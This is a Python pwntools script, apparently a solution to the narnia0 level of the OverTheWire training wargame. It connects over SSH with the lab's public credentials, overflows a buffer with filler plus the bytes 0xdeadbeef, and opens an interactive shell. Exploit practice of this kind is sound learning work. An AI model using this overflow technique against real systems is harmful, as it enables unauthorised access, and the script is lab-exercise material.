from pwn import *
shell = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)

context.update(arch='i386', os='linux')

# create a process
p = shell.process("/narnia/narnia0")

print(p.recvline())

a = b"aaaabaaacaaadaaaeaaa\xef\xbe\xad\xde"

p.sendline(a)

print(p.recvline())
print(p.recvline())
p.interactive()


